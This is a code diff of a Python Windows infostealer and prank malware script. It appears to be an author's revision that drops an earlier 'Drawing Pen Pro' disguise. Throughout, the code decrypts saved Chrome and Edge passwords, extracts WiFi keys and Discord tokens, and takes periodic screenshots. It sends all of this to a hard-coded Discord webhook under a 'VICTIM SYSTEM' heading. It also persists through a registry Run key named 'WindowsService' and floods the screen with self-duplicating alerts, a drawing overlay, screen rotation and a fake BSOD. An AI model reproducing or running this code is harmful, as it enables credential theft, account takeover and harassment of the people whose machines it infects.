@@ -11,6 +11,7 @@ import base64
 import random
 import threading
 import tkinter as tk
+from tkinter import messagebox
 from datetime import datetime
 from threading import Thread
 import tempfile
@@ -23,11 +24,9 @@ def request_admin():
     """Request administrator privileges"""
     if sys.platform == 'win32':
         try:
-            # Check if already admin
             is_admin = ctypes.windll.shell32.IsUserAnAdmin()
             if not is_admin:
                 print("[*] Requesting Administrator privileges...")
-                # Re-run the script as admin
                 ctypes.windll.shell32.ShellExecuteW(
                     None, "runas", sys.executable, " ".join(sys.argv), None, 1
                 )
@@ -36,25 +35,13 @@ def request_admin():
                 print("[+] Running with Administrator privileges")
         except Exception as e:
             print(f"[-] Admin request failed: {e}")
-    else:
-        print("[!] Not running on Windows")
 
-# Request admin FIRST
 request_admin()
-
-# Now continue with normal execution
 time.sleep(1)
 
-# Hide console window (optional - after admin request)
-# if sys.platform == 'win32':
-#     try:
-#         ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
-#     except:
-#         pass
-
-# Install required modules silently
+# ==================== INSTALL MODULES ====================
 def install_modules():
-    modules = ['pyautogui', 'requests', 'pillow', 'browser_cookie3', 'pynput', 'pycryptodome']
+    modules = ['pyautogui', 'requests', 'pillow', 'browser_cookie3', 'pynput', 'pycryptodome', 'win32crypt', 'pywin32']
     for module in modules:
         try:
             if module == 'pillow':
@@ -65,186 +52,280 @@ def install_modules():
                 __import__(module)
         except ImportError:
             print(f"Installing {module}...")
-            subprocess.run([sys.executable, '-m', 'pip', 'install', module, '--quiet', '--no-warn-script-location'], 
-                         capture_output=True, shell=True)
+            subprocess.run([sys.executable, '-m', 'pip', 'install', module, '--quiet'], capture_output=True)
 
 install_modules()
 
-# Now import all required modules
+# ==================== IMPORTS ====================
 import pyautogui
 import requests
 from PIL import Image
 import browser_cookie3
-from pynput.mouse import Controller as MouseController
-from pynput.keyboard import Controller as KeyboardController, Key
+from pynput.mouse import Controller as MouseController, Listener as MouseListener
+from pynput.keyboard import Controller as KeyboardController
 from Crypto.Cipher import AES
 import win32crypt
+import win32api
+import win32con
 
 # Configuration
-WEBHOOK_URL = "https://discord.com/api/webhooks/1502216101738709063/oCw6B_bv6gUfzxH_a-CdRNFQzWWlrv8eB_-GnRDY2r1ProS3DMqzkz6oN-3Ebe86dLkp"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1502222196049711155/8QH1tz20HOu5EGBwebwBWSKCVqIBt1jE9ZRLuZlOdOFgX_pOR2t31WpjJpiXY7C9zj9-"
 SCREENSHOT_INTERVAL = 120
 
 mouse = MouseController()
 keyboard = KeyboardController()
 
-# ==================== SCREEN ROTATION (FIXED - REQUIRES ADMIN) ====================
+# ==================== MESSAGE BOX SPAM (SOL0 ON TOP) ====================
+message_boxes = []
+active_boxes = 0
+box_lock = threading.Lock()
 
+class DoublingMessageBox:
+    """Message box that creates another when closed"""
+    def __init__(self):
+        self.window = None
+        self.is_active = True
+        
+    def create(self):
+        try:
+            # Create custom dialog
+            dialog = tk.Toplevel()
+            dialog.title("⚠️ SYSTEM ALERT")
+            dialog.geometry("450x220")
+            dialog.configure(bg='#1e1e1e')
+            dialog.resizable(False, False)
+            
+            # Center on screen randomly
+            screen_width = dialog.winfo_screenwidth()
+            screen_height = dialog.winfo_screenheight()
+            x = random.randint(50, screen_width - 500)
+            y = random.randint(50, screen_height - 270)
+            dialog.geometry(f"450x220+{x}+{y}")
+            
+            # Make it stay on top
+            dialog.attributes('-topmost', True)
+            
+            # Make it stay on top always
+            def keep_on_top():
+                while self.is_active:
+                    try:
+                        dialog.attributes('-topmost', True)
+                        time.sleep(0.5)
+                    except:
+                        break
+            Thread(target=keep_on_top, daemon=True).start()
+            
+            # Icon (warning)
+            icon_frame = tk.Frame(dialog, bg='#1e1e1e')
+            icon_frame.pack(pady=10)
+            icon_label = tk.Label(icon_frame, text="⚠️", font=("Segoe UI", 48), fg="#ff4444", bg='#1e1e1e')
+            icon_label.pack()
+            
+            # Message
+            message_label = tk.Label(dialog, text="SOL0 ON TOP!!!", font=("Segoe UI", 28, "bold"), 
+                                      fg="#ff4444", bg='#1e1e1e')
+            message_label.pack(pady=5)
+            
+            # Sub message
+            sub_label = tk.Label(dialog, text="This box cannot be closed", font=("Segoe UI", 10), 
+                                 fg="#888888", bg='#1e1e1e')
+            sub_label.pack()
+            
+            # Exit button that DOUBLES instead of closing
+            def on_exit():
+                # Create TWO more message boxes
+                for _ in range(2):
+                    new_box = DoublingMessageBox()
+                    new_box.create()
+                # Don't destroy the current one
+                print("[!] User tried to close - Created 2 more boxes!")
+            
+            button_frame = tk.Frame(dialog, bg='#1e1e1e')
+            button_frame.pack(pady=20)
+            
+            exit_button = tk.Button(button_frame, text="EXIT", command=on_exit, 
+                                    font=("Segoe UI", 12, "bold"), bg="#ff4444", fg="white",
+                                    activebackground="#cc0000", cursor="hand2", width=10)
+            exit_button.pack()
+            
+            # Also trap the X button
+            dialog.protocol("WM_DELETE_WINDOW", on_exit)
+            
+            # Store reference
+            self.window = dialog
+            
+            # Start the window
+            dialog.mainloop()
+            
+        except Exception as e:
+            print(f"Message box error: {e}")
+    
+    def close(self):
+        self.is_active = False
+        if self.window:
+            try:
+                self.window.destroy()
+            except:
+                pass
+
+def create_message_box():
+    """Create a single message box"""
+    box = DoublingMessageBox()
+    message_boxes.append(box)
+    Thread(target=box.create, daemon=True).start()
+    time.sleep(0.2)
+
+def spam_message_boxes_auto(count=15):
+    """Auto spam message boxes"""
+    print(f"[+] Creating {count} automatic message boxes...")
+    for i in range(count):
+        create_message_box()
+        time.sleep(0.2)
+
+def auto_message_box_loop():
+    """Continuously create message boxes automatically"""
+    box_count = 0
+    while True:
+        time.sleep(3)  # Create a new box every 3 seconds
+        create_message_box()
+        box_count += 1
+        print(f"[+] Auto-created message box #{box_count}")
+
+# ==================== SCREEN DRAWING (MOUSE DRAWS ON SCREEN) ====================
+drawing = True  # AUTO START DRAWING
+current_color = (255, 0, 0)  # Red
+overlay_root = None
+canvas = None
+
+def create_transparent_overlay():
+    """Create transparent overlay for drawing - AUTO"""
+    global overlay_root, canvas
+    
+    overlay_root = tk.Tk()
+    overlay_root.attributes('-fullscreen', True)
+    overlay_root.attributes('-topmost', True)
+    overlay_root.attributes('-transparentcolor', 'white')
+    overlay_root.configure(bg='white')
+    overlay_root.overrideredirect(True)
+    
+    canvas = tk.Canvas(overlay_root, bg='white', highlightthickness=0)
+    canvas.pack(fill=tk.BOTH, expand=True)
+    
+    overlay_root.update()
+    print("[+] Drawing overlay active - Mouse will draw on screen")
+    return overlay_root
+
+def auto_change_color():
+    """Automatically change drawing color every few seconds"""
+    colors = [
+        (255, 0, 0),     # Red
+        (0, 255, 0),     # Green
+        (0, 0, 255),     # Blue
+        (255, 255, 0),   # Yellow
+        (255, 0, 255),   # Magenta
+        (0, 255, 255),   # Cyan
+        (255, 165, 0),   # Orange
+        (128, 0, 128),   # Purple
+        (255, 192, 203), # Pink
+        (255, 255, 255), # White
+    ]
+    color_index = 0
+    global current_color
+    while True:
+        time.sleep(5)  # Change color every 5 seconds
+        color_index = (color_index + 1) % len(colors)
+        current_color = colors[color_index]
+
+def draw_on_screen(x, y):
+    """Draw on screen at mouse position - AUTO"""
+    if drawing and canvas:
+        color_hex = f'#{current_color[0]:02x}{current_color[1]:02x}{current_color[2]:02x}'
+        canvas.create_oval(x-5, y-5, x+5, y+5, fill=color_hex, outline=color_hex)
+        overlay_root.update()
+
+# ==================== MOUSE LISTENER (AUTO DRAW) ====================
+def on_move(x, y):
+    """Called when mouse moves - AUTO DRAW"""
+    draw_on_screen(x, y)
+
+# ==================== SCREEN ROTATION (REQUIRES ADMIN) ====================
 def rotate_screen_upside_down():
-    """Rotate screen 180 degrees (requires admin)"""
+    """Rotate screen 180 degrees - REQUIRES ADMIN"""
     try:
-        print("[*] Attempting screen rotation...")
+        print("[*] Rotating screen upside down...")
+        devmode = win32api.EnumDisplaySettings(None, 0)
+        devmode.DisplayOrientation = 2  # DMDO_180
+        devmode.Fields = win32con.DM_DISPLAYORIENTATION
         
-        # Method 1: Using PowerShell with admin rights
-        ps_script = '''
-        Add-Type @"
-        using System;
-        using System.Runtime.InteropServices;
-        public class Display {
-            [DllImport("user32.dll")]
-            public static extern int ChangeDisplaySettings(ref DEVMODE devmode, int flags);
-            
-            [StructLayout(LayoutKind.Sequential)]
-            public struct DEVMODE {
-                [MarshalAs(UnmanagedType.ByValTStr, SizeConst=32)]
-                public string dmDeviceName;
-                public short dmSpecVersion;
-                public short dmDriverVersion;
-                public short dmSize;
-                public short dmDriverExtra;
-                public int dmFields;
-                public short dmOrientation;
-                public short dmPaperSize;
-                public short dmPaperLength;
-                public short dmPaperWidth;
-                public short dmScale;
-                public short dmCopies;
-                public short dmDefaultSource;
-                public short dmPrintQuality;
-                public short dmColor;
-                public short dmDuplex;
-                public short dmYResolution;
-                public short dmTTOption;
-                public short dmCollate;
-                [MarshalAs(UnmanagedType.ByValTStr, SizeConst=32)]
-                public string dmFormName;
-                public short dmLogPixels;
-                public int dmBitsPerPel;
-                public int dmPelsWidth;
-                public int dmPelsHeight;
-                public int dmDisplayFlags;
-                public int dmDisplayFrequency;
-                public int dmICMMethod;
-                public int dmICMIntent;
-                public int dmMediaType;
-                public int dmDitherType;
-                public int dmReserved1;
-                public int dmReserved2;
-                public int dmPanningWidth;
-                public int dmPanningHeight;
-            }
-        }
-        "@
-        
-        $devmode = New-Object Display+DEVMODE
-        $devmode.dmSize = [System.Runtime.InteropServices.Marshal]::SizeOf($devmode)
-        $devmode.dmFields = 0x00000001  # DM_ORIENTATION
-        $devmode.dmOrientation = 2  # DMDO_180 (180 degrees)
-        
-        [Display]::ChangeDisplaySettings([ref]$devmode, 0)
-        '''
-        
-        result = subprocess.run(['powershell', '-Command', ps_script], capture_output=True, text=True)
-        print(f"[+] PowerShell rotation executed")
-        
-        # Method 2: Using display.exe (Windows built-in)
-        try:
-            # Try using display switch
-            subprocess.run(['display.dll', '/rotate:180'], capture_output=True, shell=True)
-        except:
-            pass
-            
-        # Method 3: Using rundll32
-        try:
-            subprocess.run(['rundll32.exe', 'user32.dll,ChangeDisplaySettings', '0x00000001', '0x00000002'], 
-                         capture_output=True, shell=True)
-        except:
-            pass
-            
-        print("[+] Screen rotated upside down!")
-        
+        result = win32api.ChangeDisplaySettings(devmode, 0)
+        if result == 0:
+            print("[+] Screen rotated 180 degrees!")
+        else:
+            print(f"[-] Rotation failed")
     except Exception as e:
         print(f"[-] Rotation error: {e}")
-        # Fallback method
+
+def screen_flicker_auto():
+    """Auto screen flicker effect"""
+    for _ in range(10):
         try:
-            import win32api
-            import win32con
             devmode = win32api.EnumDisplaySettings(None, 0)
-            devmode.DisplayOrientation = win32con.DMDO_180
+            devmode.DisplayOrientation = 2
             win32api.ChangeDisplaySettings(devmode, 0)
-            print("[+] Screen rotated using win32api")
+            time.sleep(0.05)
+            devmode.DisplayOrientation = 0
+            win32api.ChangeDisplaySettings(devmode, 0)
+            time.sleep(0.05)
         except:
-            print("[-] Could not rotate screen")
+            pass
 
-def rotate_screen_normal():
-    """Rotate screen back to normal"""
+# ==================== CREDENTIAL STEALING (DECRYPTED) ====================
+def get_chrome_master_key():
+    """Get Chrome master decryption key"""
     try:
-        subprocess.run(['powershell', '-Command', 
-                       'Add-Type -AssemblyName System.Windows.Forms; '
-                       '[System.Windows.Forms.Screen]::PrimaryScreen.Bounds'], 
-                       capture_output=True)
+        local_state_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Local State'
+        with open(local_state_path, 'r', encoding='utf-8') as f:
+            local_state = json.load(f)
+        
+        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
+        encrypted_key = encrypted_key[5:]
+        master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+        return master_key
     except:
-        pass
+        return None
 
-def screen_flicker():
-    """Make screen flicker"""
+def decrypt_chrome_password(encrypted_password, master_key):
+    """Decrypt Chrome password"""
     try:
-        for _ in range(20):
-            # Hide desktop icons briefly
-            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
-            time.sleep(0.05)
-            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 1)
-            time.sleep(0.05)
+        if not encrypted_password:
+            return None
+        
+        if encrypted_password.startswith(b'v10') or encrypted_password.startswith(b'v11'):
+            nonce = encrypted_password[3:15]
+            ciphertext = encrypted_password[15:-16]
+            tag = encrypted_password[-16:]
+            
+            cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
+            decrypted = cipher.decrypt_and_verify(ciphertext, tag)
+            return decrypted.decode('utf-8', errors='ignore')
+        else:
+            return win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode('utf-8')
     except:
-        pass
+        return None
 
-def matrix_effect():
-    """Create matrix effect on a small window"""
-    try:
-        matrix_window = tk.Tk()
-        matrix_window.title("System Update")
-        matrix_window.geometry("400x300")
-        matrix_window.attributes('-topmost', True)
-        matrix_window.configure(bg='black')
-        
-        text_widget = tk.Text(matrix_window, bg='black', fg='#0f0', font=('Courier', 12))
-        text_widget.pack(fill=tk.BOTH, expand=True)
-        
-        chars = "01ABCDEFGHIJKLMNOPQRSTUVWXYZ"
-        
-        def add_random_char():
-            char = random.choice(chars)
-            text_widget.insert(tk.END, char)
-            text_widget.see(tk.END)
-            if text_widget.index(tk.END) > '100.0':
-                text_widget.delete('1.0', '2.0')
-            matrix_window.after(50, add_random_char)
-        
-        add_random_char()
-        matrix_window.after(5000, matrix_window.destroy)
-        matrix_window.mainloop()
-    except:
-        pass
-
-# ==================== CREDENTIAL FUNCTIONS ====================
-
-def get_chrome_passwords():
-    """Extract saved passwords from Chrome"""
+def get_all_passwords():
+    """Extract ALL decrypted passwords"""
     passwords = []
+    
+    # Chrome passwords
     try:
         chrome_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'
         if os.path.exists(chrome_path):
             temp_db = tempfile.NamedTemporaryFile(delete=False)
             shutil.copy2(chrome_path, temp_db.name)
+            temp_db.close()
+            
+            master_key = get_chrome_master_key()
             
             conn = sqlite3.connect(temp_db.name)
             cursor = conn.cursor()
@@ -255,38 +336,63 @@ def get_chrome_passwords():
                 username = row[1]
                 encrypted_pass = row[2]
                 
-                try:
-                    password = win32crypt.CryptUnprotectData(encrypted_pass, None, None, None, 0)[1].decode('utf-8')
-                    passwords.append(f"✅ Chrome: {url} | User: {username} | Pass: {password}")
-                except:
-                    passwords.append(f"⚠️ Chrome: {url} | User: {username} | Pass: [ENCRYPTED]")
+                if username and encrypted_pass:
+                    if master_key:
+                        password = decrypt_chrome_password(encrypted_pass, master_key)
+                        if password:
+                            passwords.append(f"✅ Chrome: {url}\n   👤 {username}\n   🔐 `{password}`\n")
             conn.close()
             os.unlink(temp_db.name)
-    except Exception as e:
-        print(f"Chrome error: {e}")
+    except:
+        pass
+    
+    # Edge passwords
+    try:
+        edge_path = os.path.expanduser('~') + r'\AppData\Local\Microsoft\Edge\User Data\Default\Login Data'
+        if os.path.exists(edge_path):
+            temp_db = tempfile.NamedTemporaryFile(delete=False)
+            shutil.copy2(edge_path, temp_db.name)
+            temp_db.close()
+            
+            conn = sqlite3.connect(temp_db.name)
+            cursor = conn.cursor()
+            cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
+            
+            for row in cursor.fetchall():
+                url = row[0]
+                username = row[1]
+                encrypted_pass = row[2]
+                
+                if username and encrypted_pass:
+                    try:
+                        password = win32crypt.CryptUnprotectData(encrypted_pass, None, None, None, 0)[1].decode('utf-8')
+                        passwords.append(f"✅ Edge: {url}\n   👤 {username}\n   🔐 `{password}`\n")
+                    except:
+                        pass
+            conn.close()
+            os.unlink(temp_db.name)
+    except:
+        pass
+    
     return passwords
 
 def get_wifi_passwords():
-    """Extract saved WiFi passwords"""
-    wifi_passwords = []
+    """Extract WiFi passwords"""
+    wifi_list = []
     try:
         results = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True)
         profiles = [line.split(':')[1].strip() for line in results.stdout.split('\n') if 'All User Profile' in line]
         
         for profile in profiles:
-            try:
-                result = subprocess.run(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'], 
-                                      capture_output=True, text=True)
-                for line in result.stdout.split('\n'):
-                    if 'Key Content' in line:
-                        password = line.split(':')[1].strip()
-                        wifi_passwords.append(f"✅ WiFi: {profile} | Pass: {password}")
-                        break
-            except:
-                pass
+            result = subprocess.run(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'], capture_output=True, text=True)
+            for line in result.stdout.split('\n'):
+                if 'Key Content' in line:
+                    password = line.split(':')[1].strip()
+                    wifi_list.append(f"✅ WiFi: {profile}\n   🔐 `{password}`\n")
+                    break
     except:
         pass
-    return wifi_passwords
+    return wifi_list
 
 def get_discord_tokens():
     """Extract Discord tokens"""
@@ -296,6 +402,8 @@ def get_discord_tokens():
         os.path.expanduser('~') + r'\AppData\Roaming\discordcanary\Local Storage\leveldb',
     ]
     
+    token_pattern = re.compile(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}')
+    
     for path in paths:
         try:
             if os.path.exists(path):
@@ -303,29 +411,14 @@ def get_discord_tokens():
                     if file.endswith('.log') or file.endswith('.ldb'):
                         with open(os.path.join(path, file), 'r', encoding='utf-8', errors='ignore') as f:
                             content = f.read()
-                            matches = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', content)
-                            tokens.extend(matches)
+                            tokens.extend(token_pattern.findall(content))
         except:
             pass
-    return list(set(tokens))[:10]
-
-def get_browser_cookies():
-    """Extract cookies from browsers"""
-    cookies = []
-    try:
-        for cookie in browser_cookie3.chrome():
-            cookies.append(f"Chrome: {cookie.domain} | {cookie.name}")
-    except:
-        pass
-    try:
-        for cookie in browser_cookie3.edge():
-            cookies.append(f"Edge: {cookie.domain} | {cookie.name}")
-    except:
-        pass
-    return cookies[:30]
+    
+    return list(set(tokens))
 
 def get_system_info():
-    """Collect system information"""
+    """Get system information"""
     try:
         ip = requests.get('https://api.ipify.org', timeout=5).text
     except:
@@ -339,65 +432,61 @@ def get_system_info():
     }
 
 def send_to_webhook(content, is_file=False, file_bytes=None, filename=None):
-    """Send data to Discord webhook"""
+    """Send to Discord webhook"""
     try:
         if is_file and file_bytes:
             files = {'file': (filename, file_bytes, 'image/jpeg')}
-            response = requests.post(WEBHOOK_URL, files=files, timeout=30)
-            return True
+            requests.post(WEBHOOK_URL, files=files, timeout=30)
         else:
             if len(content) > 1900:
                 for i in range(0, len(content), 1900):
                     requests.post(WEBHOOK_URL, json={'content': content[i:i+1900]}, timeout=30)
             else:
                 requests.post(WEBHOOK_URL, json={'content': content}, timeout=30)
-            return True
-    except Exception as e:
-        print(f"Webhook error: {e}")
+        return True
+    except:
         return False
 
-def collect_and_send_credentials():
-    """Collect all credentials and send to webhook"""
-    print("\n[+] Collecting system information...")
+def collect_and_send_data():
+    """Collect all data and send to webhook"""
     sys_info = get_system_info()
     
-    message = f"**[🔴 SYSTEM SCAN - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}**\n"
+    message = f"**[🔴 VICTIM SYSTEM - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}**\n"
     message += f"💻 PC: {sys_info['computer']}\n"
     message += f"👤 User: {sys_info['user']}\n"
     message += f"🖥️ OS: {sys_info['os']}\n"
     message += f"🌐 IP: {sys_info['ip']}\n"
-    message += f"{'='*50}\n\n"
+    message += f"{'='*60}\n\n"
     
-    print("[+] Collecting Chrome passwords...")
-    message += "**🔑 CHROME PASSWORDS:**\n"
-    for pwd in get_chrome_passwords()[:30]:
-        message += f"{pwd}\n"
+    # Passwords
+    message += "**🔑 BROWSER PASSWORDS (DECRYPTED):**\n"
+    for pwd in get_all_passwords():
+        message += pwd
+    if not get_all_passwords():
+        message += "No passwords found\n"
     message += "\n"
     
-    print("[+] Collecting WiFi passwords...")
+    # WiFi
     message += "**📡 WIFI PASSWORDS:**\n"
-    for w in get_wifi_passwords()[:15]:
-        message += f"• {w}\n"
+    for wifi in get_wifi_passwords():
+        message += wifi
+    if not get_wifi_passwords():
+        message += "No WiFi passwords found\n"
     message += "\n"
     
-    print("[+] Collecting Discord tokens...")
+    # Discord Tokens
     message += "**🎮 DISCORD TOKENS:**\n"
-    for token in get_discord_tokens():
-        message += f"• Token: {token}\n"
-    message += "\n"
+    for token in get_discord_tokens()[:5]:
+        message += f"✅ `{token}`\n"
+    if not get_discord_tokens():
+        message += "No Discord tokens found\n"
     
-    print("[+] Collecting cookies...")
-    message += "**🍪 BROWSER COOKIES:**\n"
-    for cookie in get_browser_cookies()[:15]:
-        message += f"• {cookie}\n"
-    
-    print("[+] Sending to webhook...")
     send_to_webhook(message)
+    print("[+] Victim data sent to webhook!")
 
 # ==================== SCREENSHOT WORKER ====================
-
 def screenshot_worker():
-    """Take screenshot every 2 minutes"""
+    """Take screenshots every 2 minutes - AUTO"""
     while True:
         try:
             screenshot = pyautogui.screenshot()
@@ -408,199 +497,154 @@ def screenshot_worker():
             sys_info = get_system_info()
             filename = f"ss_{sys_info['computer']}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
             send_to_webhook(None, True, img_bytes.getvalue(), filename)
+            print(f"[+] Screenshot sent: {filename}")
             
             time.sleep(SCREENSHOT_INTERVAL)
-        except Exception as e:
-            print(f"Screenshot error: {e}")
+        except:
             time.sleep(5)
 
-# ==================== GUI EFFECTS ====================
+# ==================== MOUSE JITTER & TYPE SOLO ====================
+def mouse_jitter_auto():
+    """Auto mouse jitter - runs once"""
+    for _ in range(20):
+        x, y = mouse.position
+        mouse.position = (x + random.randint(-3, 3), y + random.randint(-3, 3))
+        time.sleep(0.05)
 
-def create_drawing_pen_gui():
-    """Create fake drawing pen GUI"""
-    try:
-        root = tk.Tk()
-        root.title("Drawing Tool")
-        root.geometry("300x400")
-        root.attributes('-topmost', True)
-        
-        screen_width = root.winfo_screenwidth()
-        screen_height = root.winfo_screenheight()
-        x = random.randint(0, screen_width - 300)
-        y = random.randint(0, screen_height - 400)
-        root.geometry(f"300x400+{x}+{y}")
-        
-        tk.Label(root, text="🖌️ Drawing Pen Pro", font=("Arial", 16, "bold")).pack(pady=10)
-        tk.Label(root, text="Pen Size:", font=("Arial", 10)).pack()
-        pen_size = tk.Scale(root, from_=1, to=20, orient=tk.HORIZONTAL)
-        pen_size.set(5)
-        pen_size.pack()
-        
-        tk.Label(root, text="Color:", font=("Arial", 10)).pack()
-        color_var = tk.StringVar(value="Black")
-        color_menu = tk.OptionMenu(root, color_var, "Black", "Red", "Blue", "Green", "Yellow")
-        color_menu.pack()
-        
-        canvas = tk.Canvas(root, bg="white", width=250, height=200)
-        canvas.pack(pady=10)
-        
-        def on_drag(event):
-            x1, y1 = (event.x - 1), (event.y - 1)
-            x2, y2 = (event.x + 1), (event.y + 1)
-            canvas.create_oval(x1, y1, x2, y2, fill=color_var.get(), width=pen_size.get())
-        
-        canvas.bind("<B1-Motion>", on_drag)
-        
-        tk.Button(root, text="Clear", command=lambda: canvas.delete("all")).pack(pady=5)
-        tk.Button(root, text="Save Drawing", command=root.destroy).pack()
-        
-        root.mainloop()
-    except Exception as e:
-        print(f"GUI error: {e}")
+def type_solo_auto():
+    """Auto type 'SOL0 ON TOP!!!' on screen"""
+    time.sleep(2)
+    keyboard.type('SOL0 ON TOP!!!')
+    keyboard.press('\n')
+    keyboard.release('\n')
 
-def blue_screen_of_death():
-    """Create fake BSOD effect"""
+# ==================== FAKE BSOD ====================
+def fake_bsod_auto():
+    """Create fake BSOD effect - AUTO after 20 seconds"""
+    time.sleep(20)
     try:
         bsod = tk.Tk()
         bsod.attributes('-fullscreen', True)
         bsod.configure(bg='#0000AA')
         bsod.attributes('-topmost', True)
         
-        text_frame = tk.Frame(bsod, bg='#0000AA')
-        text_frame.pack(expand=True)
+        label = tk.Label(bsod, text=":(", font=("Consolas", 72), fg="white", bg='#0000AA')
+        label.pack(pady=100)
         
-        sad_face = tk.Label(text_frame, text=":(", font=("Consolas", 72, "bold"), fg="white", bg='#0000AA')
-        sad_face.pack(pady=50)
+        text = tk.Label(bsod, text="SOL0 ON TOP!!! - Your PC ran into a problem\n\nStop code: CRITICAL_PROCESS_DIED", 
+                       font=("Consolas", 16), fg="white", bg='#0000AA')
+        text.pack()
         
-        error_text = """Your PC ran into a problem and needs to restart. We're just collecting some error info, and then we'll restart for you.
-        
-Stop code: CRITICAL_PROCESS_DIED
-
-What failed: DrawingPen.sys"""
-        
-        error_label = tk.Label(text_frame, text=error_text, font=("Consolas", 14), fg="white", bg='#0000AA', justify=tk.LEFT)
-        error_label.pack(pady=30)
-        
-        progress = tk.Canvas(text_frame, width=500, height=20, bg='#0000AA', highlightthickness=0)
-        progress.pack(pady=20)
+        # Progress bar
+        progress = tk.Canvas(bsod, width=400, height=20, bg='#0000AA', highlightthickness=0)
+        progress.pack(pady=50)
         progress.create_rectangle(0, 0, 0, 20, fill='white', tags='progress')
         
         def update_progress():
             for i in range(101):
-                progress.coords('progress', 0, 0, (500 * i / 100), 20)
-                text_frame.update()
-                time.sleep(0.03)
+                progress.coords('progress', 0, 0, (400 * i / 100), 20)
+                bsod.update()
+                time.sleep(0.05)
             bsod.destroy()
         
         Thread(target=update_progress, daemon=True).start()
         bsod.mainloop()
-    except Exception as e:
-        print(f"BSOD error: {e}")
-
-def mouse_jitter():
-    """Make mouse jitter"""
-    try:
-        for _ in range(30):
-            x, y = mouse.position
-            mouse.position = (x + random.randint(-3, 3), y + random.randint(-3, 3))
-            time.sleep(0.05)
-    except:
-        pass
-
-def type_solo():
-    """Type 'Solo' on screen"""
-    try:
-        time.sleep(0.5)
-        keyboard.type('Solo')
-        time.sleep(0.5)
-        keyboard.press(Key.enter)
-        keyboard.release(Key.enter)
     except:
         pass
 
 # ==================== ADD TO STARTUP ====================
-
 def add_to_startup():
-    """Add to Windows startup"""
+    """Add to Windows startup - AUTO"""
     try:
         script_path = os.path.abspath(sys.argv[0])
         key = winreg.HKEY_CURRENT_USER
         subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
         with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as registry_key:
-            winreg.SetValueEx(registry_key, "WindowsDrawingService", 0, winreg.REG_SZ, 
+            winreg.SetValueEx(registry_key, "WindowsService", 0, winreg.REG_SZ, 
                             f'"{sys.executable}" "{script_path}"')
-        print("[+] Added to startup")
-        return True
-    except Exception as e:
-        print(f"[-] Startup error: {e}")
-        return False
+        print("[+] Added to Windows startup")
+    except:
+        pass
 
-# ==================== MAIN ====================
-
+# ==================== MAIN - FULLY AUTOMATIC ====================
 def main():
-    print("="*50)
-    print("🖌️ DRAWING PEN PRO - ADMIN MODE")
-    print("="*50)
+    print("="*60)
+    print("🔥 SOL0 ON TOP!!! - FULLY AUTOMATIC")
+    print("="*60)
+    print("[+] Administrator mode: ACTIVE")
+    print("[+] NO KEYS NEEDED - Everything runs automatically")
+    print("="*60)
     
     # Add to startup
     add_to_startup()
+    time.sleep(2)
     
-    time.sleep(3)
+    # Collect and send credentials to webhook
+    print("\n[+] Collecting victim data...")
+    collect_and_send_data()
     
-    # Send credentials
-    collect_and_send_credentials()
+    # Start drawing overlay (AUTO)
+    print("\n[+] Activating screen drawing overlay...")
+    overlay_thread = Thread(target=create_transparent_overlay, daemon=True)
+    overlay_thread.start()
+    time.sleep(1)
     
-    # Start screen effects AFTER sending data
-    def start_effects():
-        time.sleep(5)
-        
-        # ROTATE SCREEN UPSIDE DOWN (NOW WORKING WITH ADMIN)
-        print("[+] Rotating screen upside down...")
-        rotate_screen_upside_down()
-        
-        time.sleep(2)
-        
-        # Screen flicker
-        print("[+] Screen flicker...")
-        screen_flicker()
-        
-        # Matrix effect
-        print("[+] Matrix effect...")
-        Thread(target=matrix_effect, daemon=True).start()
-        
-        # Mouse jitter
-        mouse_jitter()
-        
-        # Type Solo
-        type_solo()
+    # Start mouse listener for drawing (AUTO)
+    mouse_listener = MouseListener(on_move=on_move)
+    mouse_listener.daemon = True
+    mouse_listener.start()
+    print("[+] Mouse drawing active - Every mouse move draws on screen!")
     
-    effect_thread = Thread(target=start_effects, daemon=True)
-    effect_thread.start()
+    # Auto change colors every 5 seconds
+    color_thread = Thread(target=auto_change_color, daemon=True)
+    color_thread.start()
+    print("[+] Auto color change every 5 seconds")
     
-    # Start Drawing GUI
-    print("[+] Starting Drawing GUI...")
-    Thread(target=create_drawing_pen_gui, daemon=True).start()
+    # Rotate screen upside down (AUTO)
+    print("\n[+] Rotating screen upside down...")
+    rotate_screen_upside_down()
     
-    # BSOD after 30 seconds
-    def show_bsod():
-        time.sleep(30)
-        blue_screen_of_death()
-    Thread(target=show_bsod, daemon=True).start()
+    # Screen flicker effect (AUTO)
+    print("[+] Screen flicker effect...")
+    Thread(target=screen_flicker_auto, daemon=True).start()
     
-    # Start screenshot worker
-    print("[+] Screenshot worker active (every 2 minutes)")
-    print("[+] Press Ctrl+C to stop\n")
+    # Mouse jitter (AUTO)
+    print("[+] Mouse jitter effect...")
+    Thread(target=mouse_jitter_auto, daemon=True).start()
     
-    try:
-        screenshot_worker()
-    except KeyboardInterrupt:
-        print("\n[+] Stopping...")
-        sys.exit(0)
+    # Type SOL0 ON TOP!!! (AUTO)
+    print("[+] Typing 'SOL0 ON TOP!!!'...")
+    Thread(target=type_solo_auto, daemon=True).start()
+    
+    # AUTO MESSAGE BOX SPAM - Continuous
+    print("\n[+] Starting automatic message box spam...")
+    print("    → Boxes say 'SOL0 ON TOP!!!'")
+    print("    → Clicking EXIT creates 2 MORE boxes")
